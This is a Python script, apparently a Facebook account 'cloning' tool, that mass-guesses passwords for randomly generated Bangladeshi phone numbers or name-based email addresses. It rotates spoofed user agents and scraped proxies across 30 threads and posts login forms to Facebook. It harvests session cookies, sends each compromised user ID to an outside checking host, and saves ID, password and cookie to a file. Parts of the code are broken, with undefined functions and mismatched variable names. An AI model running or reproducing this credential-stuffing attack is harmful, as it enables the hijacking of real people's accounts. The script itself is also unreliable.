#Create By: Md Elias 
#FaceBook: Md Elias 
#GitHub: https://github.com/Elias2769
#---------------------------------------------------------------------------#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='NokiaN8-00/012.002;'
    e='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
os.system('xdg-open https://github.com/Elias2769/')
logo = (""" \033[1;32
                                                               
\033[1;32m88888888888  88           88         db         ad88888ba      
\033[1;32m88           88           88        d88b       d8"     "8b     
\033[1;33m88           88           88       d8'`8b      Y8,             
\033[1;33m88aaaaa      88           88      d8'  `8b     `Y8aaaaa,       
\033[1;34m88"""""      88           88     d8YaaaaY8b      `"""""8b,     
\033[1;34m88           88           88    d8""""""""8b           `8b     
\033[1;35m88           88           88   d8'        `8b  Y8a     a8P     
\033[1;35m88888888888  88888888888  88  d8'          `8b  "Y88888P"      
                                                               
                                                              
\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;37m[+] OWNER       : \033[1;32mELIAS HOSSEN        
\033[1;37m[+] FACEBOOK    : \033[1;32mELI AS        
\033[1;37m[+] WhatsApp    : \033[1;32mElias      
\033[1;37m[+] GITHUB      : \033[1;32Elias2769       
\033[1;37m[+] TOOLS       : \033[1;32mFREE     \033[1;37m              
\033[1;37m[+] VERSION     : \033[1;32m1.00  \033[1;37m                 
\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def Elias():
 print('\033[1;30m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
pass
os.system('clear')
banner()
print("\033[1;32m [+]  \033[1;32mElias \033[1;32mis \033[1;32mAlways \033[1;32mFire \033[1;32mMan    \033[0;97m")
print('\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
import getpass

attemps = 0

while attemps < 12345677901:
 
    username = input(' \033[1;32m[+]\033[1;32m  Enter Licences : ')
    if username == 'DXG':
        jalan(' \033[1;32m[✔]\033[1;32m  Login Successfully')
        os.system("espeak -a 300 \"Login Successfully\"")
        print('\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        break
    else:
       jalan(' \033[1;32m[✖]\033[1;31m  Incorrect Licences')
       os.system("espeak -a 300 \"Incorrect, Licences,\"")
       attemps += 1
       continue
#---------------------[LOOP MENU]---------------------#
class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("\033[1;32m [A] BD RANDOM CLONING")
        print("\033[1;32m[B] RANDOM GMAIL CLONING ")
        print("\033[1;91m [E] EXIT")
        print('\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        Demon =input(" [+] SELECT : ")
        os.system('xdg-open https://www.facebook.com/profile.php?id=100024453049418')
        os.system('xdg-open https://www.facebook.com/profile.php?id=100024453049418')
        if Demon in ["1", "A"]:
            num()
        if Demon in ["2","B"]:
            gml()
        if Demon in [" 0", "E"]:
            exit()
        else:
            exit()
def num():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[1;32m [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
    print('\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    kode = input('\033[1;32m [+] CHOOSE : ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('\033[1;32m [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print('\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    limit = int(input('\033[1;32m [+] LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as TC:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;97m[🌿] SIM 3G,4G +WIFI')
        print('\033[1;97m[🌿] Total ids: '+tl)
        print("\033[1;97m[🌿] Your Code: "+code)
        print('\033[1;97m[🌿] Airplne Moode On/Off')
        print('-------------------')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx =[kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'jannat','bangladesh']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')

def gml():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('\033[1;32m [+] TARGET FIRST NAME : ')
    os.system('clear')
    print(logo)
    kodex = input('\033[1;32m [+] TARGET LAST NAME :  ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    doamin = input('\033[1;32m [📧]  INPUT DOMINE  : ')
    os.system('clear')
    print(logo)
    print('\033[1;32m [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit = int(input('[+] LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'\033[1;97m[+] \033[1;97mTOTAL IDS   :  \033[1;97m'+tl)
        print(f'\033[1;97m[+] \033[1;97mFIRST NAME  :\033[1;97m {kode} ')
        print(f'\033[1;97m[+] \033[1;97mLAST NAME   :\033[1;97m {kodex} ')
        print('\033[1;97m[+] \033[1;97mNETWORK     : WIFI/DATA')
        print('\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'@123',kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mELIAS-XD\033[1;97m] >< [%s/%s] >< [OK\033[1;97m: \033[1;92m%s\033[1;97m] >< [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'x.facebook.com',
    'method': 'GET',
    'scheme': 'https',
    'path': '/',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.5',
    'referer': 'https://www.google.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',}
            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cix = coki.split('c_user=')[1]
                cid = cix[0:15]
                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={cid}").text
                if res == 'LIVE':
                    print(f'\r\033[1;32m [ELIAS-OK] '+cid+' | '+ps+'\033[1;32m')
                    print(f'\r\033[1;37m [🍪] COOKIE : '+coki)
                    print('\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                    oks.append(cid)
                    open('/sdcard/ELIAS-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                    break
                if res == 'LOCK':
                    print(f'\r\033[1;91m [ELIAS-LK] '+cid+' | '+ps+'\033[1;37m')
                    #print(f'\r\033[1;37m [🍪] COOKIE : '+coki)
                    #print('\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                    break
            else:
                continue
        loop+=1        
    except:
        pass
Main()
